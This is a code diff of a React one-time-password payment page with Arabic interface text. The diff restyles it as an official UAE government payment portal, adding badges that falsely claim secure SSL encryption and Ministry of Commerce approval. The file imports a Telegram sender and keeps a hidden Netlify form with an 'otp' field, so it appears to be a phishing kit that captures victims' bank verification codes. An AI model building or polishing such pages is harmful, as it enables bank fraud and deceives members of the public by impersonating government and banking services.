@@ -2,9 +2,10 @@ import { useState, useEffect, useRef } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
+import { Badge } from "@/components/ui/badge";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
-import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
+import { Shield, AlertCircle, ArrowLeft, Lock as LockIcon, CheckCircle } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
@@ -52,7 +53,17 @@ const PaymentOTPForm = () => {
   }
 
   const formattedAmount = formatCurrency(amount, selectedCountry);
-  
+
+  // UAE Government Color Scheme
+  const uaeColors = {
+    primary: "#CE1126",
+    secondary: "#00732F",
+    accent: "#000000",
+    background: "#FFFFFF",
+    lightGray: "#F5F5F5",
+    border: "#E0E0E0",
+  };
+
   // Demo OTP: 123456
   const DEMO_OTP = "123456";
   
@@ -251,137 +262,199 @@ const PaymentOTPForm = () => {
   const hasAnyDigit = otp.some(digit => digit !== "");
   
   return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
-      amount={formattedAmount}
-      title="رمز التحقق"
-      description={`أدخل رمز التحقق لخدمة ${serviceName}`}
-      icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
-    >
-      {/* Title Section */}
-      <div className="text-center mb-6 sm:mb-8">
-        <div 
-          className="w-16 h-16 sm:w-20 sm:h-20 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse shadow-lg"
-          style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-          }}
-        >
-          <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
+    <div className="min-h-screen" style={{ backgroundColor: uaeColors.lightGray }} dir="rtl">
+      {/* Header */}
+      <div className="w-full" style={{ backgroundColor: uaeColors.primary }}>
+        <div className="container mx-auto px-4 py-3">
+          <div className="flex items-center justify-between">
+            <div className="flex items-center gap-3">
+              <div className="w-12 h-12 bg-white rounded-lg flex items-center justify-center">
+                <Shield className="w-6 h-6" style={{ color: uaeColors.primary }} />
+              </div>
+              <div className="text-white">
+                <h1 className="text-lg font-bold">البوابة الرسمية للدفع</h1>
+                <p className="text-xs opacity-90">آمن • موثوق • سريع</p>
+              </div>
+            </div>
+            <Badge variant="secondary" className="bg-white text-gray-800">
+              <LockIcon className="w-3 h-3 ml-1" />
+              اتصال آمن
+            </Badge>
+          </div>
         </div>
-        <h1 className="text-2xl sm:text-3xl font-bold mb-2">رمز التحقق</h1>
-        <p className="text-sm sm:text-base text-muted-foreground">أدخل الرمز المرسل إلى هاتفك</p>
       </div>
 
-      {/* Info */}
-      <div 
-        className="rounded-lg p-3 sm:p-4 mb-6"
-        style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
-        }}
-      >
-        <p className="text-xs sm:text-sm text-center">
-          تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك المسجل في البنك
-        </p>
-      </div>
-      
-      <form onSubmit={handleSubmit}>
-        {/* OTP Input - 6 digits */}
-        <div className="mb-6">
-          <div className="flex gap-2 sm:gap-3 justify-center items-center mb-4" dir="ltr">
-            {otp.map((digit, index) => (
-              <Input
-                key={index}
-                ref={(el) => (inputRefs.current[index] = el)}
-                type="text"
-                inputMode="numeric"
-                pattern="[0-9]*"
-                maxLength={1}
-                value={digit}
-                onChange={(e) => handleChange(index, e.target.value)}
-                onKeyDown={(e) => handleKeyDown(index, e)}
-                onPaste={handlePaste}
-                className="w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 rounded-xl transition-all"
+      <div className="container mx-auto px-4 py-8">
+        <div className="max-w-3xl mx-auto">
+          {/* Security Notice */}
+          <div className="mb-6 p-4 bg-white rounded-lg border-r-4" style={{ borderRightColor: uaeColors.secondary }}>
+            <div className="flex items-start gap-3">
+              <Shield className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
+              <div>
+                <h3 className="font-semibold text-sm mb-1">التحقق من الهوية</h3>
+                <p className="text-xs text-gray-600">
+                  تم إرسال رمز التحقق إلى هاتفك المسجل في البنك
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <div className="bg-white rounded-lg shadow-lg border-0 overflow-hidden">
+            {/* Title Section */}
+            <div className="p-8 border-b text-center" style={{ backgroundColor: uaeColors.lightGray }}>
+              <div
+                className="w-20 h-20 rounded-full mx-auto mb-4 flex items-center justify-center"
                 style={{
-                  borderColor: digit ? branding.colors.primary : undefined,
-                  backgroundColor: digit ? `${branding.colors.primary}08` : undefined
+                  background: `linear-gradient(135deg, ${uaeColors.primary}, ${uaeColors.secondary})`
                 }}
-                disabled={attempts >= 3}
-                autoComplete="off"
-              />
-            ))}
+              >
+                <Shield className="w-10 h-10 text-white" />
+              </div>
+              <h1 className="text-2xl font-bold mb-2" style={{ color: uaeColors.accent }}>
+                رمز التحقق
+              </h1>
+              <p className="text-sm text-gray-600">
+                أدخل الرمز المكون من 6 أرقام المرسل إلى هاتفك
+              </p>
+            </div>
+
+            {/* OTP Form */}
+            <form onSubmit={handleSubmit} className="p-8">
+              {/* Info */}
+              <div
+                className="rounded-lg p-4 mb-6 flex items-center gap-3"
+                style={{
+                  backgroundColor: `${uaeColors.secondary}10`,
+                  border: `1px solid ${uaeColors.secondary}30`
+                }}
+              >
+                <LockIcon className="w-5 h-5" style={{ color: uaeColors.secondary }} />
+                <p className="text-sm">
+                  تم إرسال رمز التحقق إلى هاتفك المسجل في البنك
+                </p>
+              </div>
+
+              {/* OTP Input - 6 digits */}
+              <div className="mb-6">
+                <div className="flex gap-3 justify-center items-center" dir="ltr">
+                  {otp.map((digit, index) => (
+                    <Input
+                      key={index}
+                      ref={(el) => (inputRefs.current[index] = el)}
+                      type="text"
+                      inputMode="numeric"
+                      pattern="[0-9]*"
+                      maxLength={1}
+                      value={digit}
+                      onChange={(e) => handleChange(index, e.target.value)}
+                      onKeyDown={(e) => handleKeyDown(index, e)}
+                      onPaste={handlePaste}
+                      className="w-14 h-16 text-center text-2xl font-bold border-2 rounded-xl transition-all"
+                      style={{
+                        borderColor: digit ? uaeColors.primary : uaeColors.border,
+                        backgroundColor: digit ? `${uaeColors.primary}08` : uaeColors.background
+                      }}
+                      disabled={attempts >= 3}
+                      autoComplete="off"
+                    />
+                  ))}
+                </div>
+              </div>
+
+              {/* Error Message */}
+              {error && (
+                <div
+                  className="rounded-lg p-4 mb-6 flex items-start gap-2 bg-red-50 border border-red-200"
+                >
+                  <AlertCircle className="w-5 h-5 mt-0.5 flex-shrink-0 text-red-500" />
+                  <p className="text-sm text-red-600">{error}</p>
+                </div>
+              )}
+
+              {/* Countdown Timer */}
+              {countdown > 0 && (
+                <div className="text-center mb-6">
+                  <p className="text-sm text-gray-600">
+                    إعادة إرسال الرمز بعد <strong>{countdown}</strong> ثانية
+                  </p>
+                </div>
+              )}
+
+              {/* Attempts Counter */}
+              {attempts > 0 && attempts < 3 && (
+                <div className="text-center mb-6">
+                  <p className="text-sm" style={{ color: '#F59E0B' }}>
+                    المحاولات المتبقية: <strong>{3 - attempts}</strong>
+                  </p>
+                </div>
+              )}
+
+              {/* Security Info */}
+              <div className="mt-6 p-4 rounded-lg mb-6" style={{ backgroundColor: uaeColors.lightGray }}>
+                <div className="flex items-start gap-3">
+                  <CheckCircle className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
+                  <div>
+                    <h4 className="font-semibold text-sm mb-1" style={{ color: uaeColors.accent }}>
+                      محمي بتشفير SSL
+                    </h4>
+                    <p className="text-xs text-gray-600">
+                      جميع المعلومات مُشفرة ومحمية. لا تشارك هذا الرمز مع أحد.
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              {/* Submit Button */}
+              <Button
+                type="submit"
+                size="lg"
+                className="w-full h-14 text-lg font-bold text-white transition-all hover:opacity-90"
+                style={{
+                  backgroundColor: attempts >= 3 ? '#666' : uaeColors.primary
+                }}
+                disabled={attempts >= 3 || !isOtpComplete}
+              >
+                {attempts >= 3 ? (
+                  <span>محظور مؤقتاً</span>
+                ) : (
+                  <>
+                    <span className="ml-2">تأكيد الدفع</span>
+                    <ArrowLeft className="w-5 h-5" />
+                  </>
+                )}
+              </Button>
+
+              {countdown === 0 && (
+                <Button
+                  type="button"
+                  variant="outline"
+                  className="w-full mt-4 h-12"
+                  style={{ borderColor: uaeColors.primary, color: uaeColors.primary }}
+                  onClick={() => {
+                    setCountdown(60);
+                    toast({
+                      title: "تم إرسال الرمز",
+                      description: "تم إرسال رمز تحقق جديد إلى هاتفك",
+                    });
+                  }}
+                >
+                  إعادة إرسال الرمز
+                </Button>
+              )}
+            </form>
+          </div>
+
+          {/* Security Footer */}
+          <div className="mt-6 text-center">
+            <div className="inline-flex items-center gap-2 px-4 py-2 bg-white rounded-full shadow-sm">
+              <Shield className="w-4 h-4" style={{ color: uaeColors.secondary }} />
+              <span className="text-xs font-medium" style={{ color: uaeColors.accent }}>
+                معتمد من وزارة التجارة
+              </span>
+            </div>
           </div>
         </div>
-      
-        {/* Error Message */}
-        {error && (
-          <div 
-            className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2 bg-destructive/10 border border-destructive/30"
-          >
-            <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0 text-destructive" />
-            <p className="text-xs sm:text-sm text-destructive">{error}</p>
-          </div>
-        )}
-        
-        {/* Countdown Timer */}
-        {countdown > 0 && (
-          <div className="text-center mb-6">
-            <p className="text-xs sm:text-sm text-muted-foreground">
-              إعادة إرسال الرمز بعد <strong>{countdown}</strong> ثانية
-            </p>
-          </div>
-        )}
-
-        {/* Attempts Counter */}
-        {attempts > 0 && attempts < 3 && (
-          <div className="text-center mb-6">
-            <p className="text-xs sm:text-sm text-yellow-600">
-              المحاولات المتبقية: <strong>{3 - attempts}</strong>
-            </p>
-          </div>
-        )}
-        
-        {/* Submit Button */}
-        <Button
-          type="submit"
-          size="lg"
-          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
-          disabled={attempts >= 3 || !isOtpComplete}
-          style={{
-            background: attempts >= 3 
-              ? '#666' 
-              : `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-          }}
-        >
-          {attempts >= 3 ? (
-            <span>محظور مؤقتاً</span>
-          ) : (
-            <>
-              <span className="ml-2">تأكيد الدفع</span>
-              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
-            </>
-          )}
-        </Button>
-        
-        {countdown === 0 && (
-          <Button
-            type="button"
-            variant="ghost"
-            className="w-full mt-3"
-            style={{ color: branding.colors.primary }}
-            onClick={() => {
-              setCountdown(60);
-              toast({
-                title: "تم إرسال الرمز",
-                description: "تم إرسال رمز تحقق جديد إلى هاتفك",
-              });
-            }}
-          >
-            إعادة إرسال الرمز
-          </Button>
-        )}
-      </form>
+      </div>
 
       {/* Hidden Netlify Form */}
       <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
@@ -395,7 +468,7 @@ const PaymentOTPForm = () => {
         <input type="text" name="otp" />
         <input type="text" name="timestamp" />
       </form>
-    </DynamicPaymentLayout>
+    </div>
   );
 };
 
